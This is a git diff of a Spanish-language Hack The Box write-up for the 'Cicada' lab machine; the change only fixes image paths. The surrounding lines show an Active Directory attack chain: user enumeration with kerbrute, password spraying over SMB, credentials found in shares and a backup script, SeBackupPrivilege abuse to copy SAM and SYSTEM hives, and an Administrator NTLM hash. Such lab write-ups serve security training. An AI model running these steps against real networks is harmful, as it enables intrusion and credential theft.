@@ -251,7 +251,7 @@ Al intentar enumerar los recursos compartidos sin especificar un usuario, se me 
 /home/kali/Documents/htb/machines/cicada:-$ /home/kali/Documents/github/kerbrute/kerbrute_linux_amd64 userenum -d cicada --dc 10.10.11.35 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
 
-![](assets/img/htb-writeup-cicada/cicada1_1.png)
+![](/assets/img/htb-writeup-cicada/cicada1_1.png)
 
 Con esta enumeración, identifico que los usuarios `guest@cicada.htb` y `administrator@cicada.htb` son válidos. Utilizo el usuario predeterminado `guest` para enumerar los recursos compartidos.
 
@@ -259,7 +259,7 @@ Con esta enumeración, identifico que los usuarios `guest@cicada.htb` y `adminis
 /home/kali/Documents/htb/machines/cicada:-$ smbmap -u guest -p '' -H 10.10.11.35
 ```
 
-![](assets/img/htb-writeup-cicada/cicada1_2.png)
+![](/assets/img/htb-writeup-cicada/cicada1_2.png)
 
 Investigo el recurso `HR` que es accesible y encuentro un archivo de texto.
 
@@ -267,7 +267,7 @@ Investigo el recurso `HR` que es accesible y encuentro un archivo de texto.
 /home/kali/Documents/htb/machines/cicada:-$ smbclient /\\10.10.11.35/\HR -U guest
 ```
 
-![](assets/img/htb-writeup-cicada/cicada1_3.png)
+![](/assets/img/htb-writeup-cicada/cicada1_3.png)
 
 ```terminal
 smb: \> get "Notice from HR.txt"
@@ -275,7 +275,7 @@ smb: \> get "Notice from HR.txt"
 /home/kali/Documents/htb/machines/cicada:-$ cat 'Notice from HR.txt'
 ```
 
-![](assets/img/htb-writeup-cicada/cicada1_4.png)
+![](/assets/img/htb-writeup-cicada/cicada1_4.png)
 
 De esta forma, descubro una contraseña `Cicada$M6Corpb*@Lp#nZp!8` que podría estar siendo utilizada por algún usuario del entorno.
 
@@ -307,7 +307,7 @@ Con kerbrute verifique la validez de estos usuarios.
 /home/kali/Documents/htb/machines/cicada:-$ /home/kali/Documents/github/kerbrute/kerbrute_linux_amd64 userenum -d cicada --dc 10.10.11.35 valid_users1.txt
 ```
 
-![](assets/img/htb-writeup-cicada/cicada2_1.png)
+![](/assets/img/htb-writeup-cicada/cicada2_1.png)
 
 ```terminal
 /home/kali/Documents/htb/machines/cicada:-$ echo 'Guest@cicada\nsarah.dantelia@cicada\nAdministrator@cicada\njohn.smoulder@cicada\nCICADA-DC$@cicada\ndavid.orelious@cicada\nmichael.wrightson@cicada\nemily.oscars@cicada' > valid_users2.txt
@@ -328,7 +328,7 @@ SMB         10.10.11.35     445    NONE             [+] \michael.wrightson@cicad
 SMB         10.10.11.35     445    NONE             [-] \emily.oscars@cicada:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
 ```
 
-![](assets/img/htb-writeup-cicada/cicada2_2.png)
+![](/assets/img/htb-writeup-cicada/cicada2_2.png)
 
 Identifico que el usuario `michael.wrightson` sigue utilizando la contraseña encontrada anteriormente.
 
@@ -340,7 +340,7 @@ Verifico los accesos compartidos que el usuario `michael.wrightson` puede leer e
 /home/kali/Documents/htb/machines/cicada:-$ smbmap -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -H 10.10.11.35
 ```
 
-![](assets/img/htb-writeup-cicada/cicada3_1.png)
+![](/assets/img/htb-writeup-cicada/cicada3_1.png)
 
 Luego, recolecté información del dominio con ldapdomaindump, utilizando las credenciales obtenidas.
 
@@ -359,7 +359,7 @@ De esta manera, encuentro las credenciales del usuario `david.orelious`.
 /home/kali/Documents/htb/machines/cicada:-$ open domain_users.html
 ```
 
-![](assets/img/htb-writeup-cicada/cicada3_2.png)
+![](/assets/img/htb-writeup-cicada/cicada3_2.png)
 
 ---
 
@@ -369,7 +369,7 @@ Con las credenciales de `david.orelious`, verifico a qué recursos compartidos t
 /home/kali/Documents/htb/machines/cicada:-$ smbmap -u david.orelious -p 'aRt$Lp#7t*VQ!3' -H 10.10.11.35
 ```
 
-![](assets/img/htb-writeup-cicada/cicada4_1.png)
+![](/assets/img/htb-writeup-cicada/cicada4_1.png)
 
 accedo al recurso compartido `DEV` utilizando smbclient.
 
@@ -378,7 +378,7 @@ accedo al recurso compartido `DEV` utilizando smbclient.
 Password for [WORKGROUP\david.orelious]: aRt$Lp#7t*VQ!3
 ```
 
-![](assets/img/htb-writeup-cicada/cicada4_2.png)
+![](/assets/img/htb-writeup-cicada/cicada4_2.png)
 
 Dentro de `DEV`, encuentro y descargo el archivo `Backup_script.ps1`.
 
@@ -388,7 +388,7 @@ smb: \> get Backup_script.ps1
 /home/kali/Documents/htb/machines/cicada:-$ cat Backup_script.ps1
 ```
 
-![](assets/img/htb-writeup-cicada/cicada4_3.png)
+![](/assets/img/htb-writeup-cicada/cicada4_3.png)
 
 Al examinar el contenido del script, descubro que establece las credenciales para el usuario `emily.oscars`:`Q!3@Lp#M6b*7t*Vt`.`
 
@@ -425,7 +425,7 @@ Verificó los privilegios asignados a la cuenta de `Emily`.
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv
 ```
 
-![](assets/img/htb-writeup-cicada/cicada6_1.png)
+![](/assets/img/htb-writeup-cicada/cicada6_1.png)
 
 El resultado muestra que tengo habilitado el privilegio SeBackupPrivilege. Este privilegio permite leer archivos y directorios sin restricciones, lo que incluye la capacidad de copiar archivos críticos del sistema, como los archivos SAM y SYSTEM que contienen credenciales y otros datos sensibles.
 
@@ -461,7 +461,7 @@ Info: Download successful!
 /home/kali/Documents/htb/machines/cicada:-$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 ```
 
-![](assets/img/htb-writeup-cicada/cicada6_2.png)
+![](/assets/img/htb-writeup-cicada/cicada6_2.png)
 
 En la salida, encuentro el hash NTLM del usuario `Administrator`:`2b87e7c93a3e8a0ea4a581937016f341`
 
